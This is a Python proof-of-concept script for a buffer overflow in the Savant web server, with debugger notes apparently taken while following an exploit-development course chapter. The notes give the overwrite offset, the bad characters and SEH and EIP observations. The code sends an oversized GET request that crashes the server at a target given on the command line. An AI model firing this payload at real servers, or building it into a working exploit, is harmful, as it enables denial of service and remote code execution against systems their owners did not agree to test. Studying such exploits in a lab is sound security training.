"""
OMER: Generated this template for following along on Ch6

> Could try on my own to figure out how big of a payload i can send before it crashes


> Found out this is the max that triggers an AV on, but the EIP wasnt overwrittenFound out this is the max that triggers an AV on, but the EIP wasnt overwritten

> exchain isnt being overwritten, cant increase overwrite size either
!exchain
04aaff60: Savant+18468 (00418468)
04aaffcc: ntdll!_except_handler4+0 (76f58dd0)
04aaffe4: ntdll!FinalExceptionHandlePad60+0 (76f6672c)


> signs of SEH taking over?
0:005> dd esp
0265ea1c 00414141 0265ea74 0041703c 019157b0
0265ea2c 019157b0 00000000 00000000 00000000
0265ea3c 00000000 00000000 00000000 00000000
0265ea4c 00000000 00000000 00000000 00000000
0265ea5c 00000000 00000000 00000000 00000000
0265ea6c 00000000 00000002 00544547 00000000
0265ea7c 00000000 00000000 00000000 00000000
0265ea8c 4141412f 41414141 41414141 41414141

00414141 <- didnt notice this at first, but from the book
            saw that this is null terminated cause of the 0's.
            i thought it was something else overwriting
            im sending

book glossed over this since its not a viable path here
but it is possible to indirect jump to register and redirect exec flow
done by checking whats stored in which reg and then
`JMP/CALL reg` kind of already done with PPR

> 04baea20 04baea74 <- looks like its pointing somewhere close,
                       confirmed visually as well
0:005> dds esp
04baea1c 00414141 Savant+0x14141
04baea20 04baea74
04baea24 0041703c Savant+0x1703c
04baea28 001f57b0
04baea2c 001f57b0
04baea30 00000000
04baea34 00000000

> Using dc poi(esp+4), we can access the entire GET string used for the overflow
> Need a JMP command to jump me to dc poi(esp+4)
> offset found to be at 0x116

masf_nasm to jmp command in EIP
E911010000, this is way too long of an instruction

> found bad chars 0x00, 0x0A, 0x0D, 0x25
note, have not bothered with finding the offset yet
same goes for finding a suitable PPR lib as well as the offset

> gonna try to look for the offset, see how the URL is in memory
0040c05f -< offset
mangled, something intervened
attempt to find by bytes

found! offset of 253
? why was the pattern fucked with
? null termination didnt trigger for 41's and 42's but
  triggers for the pattern
"""

import socket
import sys
import struct


def send_crash(server, port):
    size = 260  # Triggered AV, EIP corrupted(barely)
    # size = 261      # Triggered AV, EIP not corrupted
    # size = 265      # Triggered AV, EIP not corrupted
    # size = 294      # Max of Triggered AV, EIP not corrupted

    buffer = b"GET /"
    # payload = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai"
    payload = b""

    # Confirmed, 42's were swapped out with 41's.
    #            Offset is at 253
    payload += b"\x41" * 257
    payload += b"\x42" * 3

    buffer += payload
    buffer += b"\r\n\r\n"
    print(f"[+] Buffer Length: {len(payload)}")
    print(f"[+] Sending Buffer: {payload}")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buffer)
    s.close()


if __name__ == "__main__":
    try:
        server = sys.argv[1]
        port = 80
        send_crash(server=server, port=port)

        print("Done!")
    except Exception as e:
        print(e)
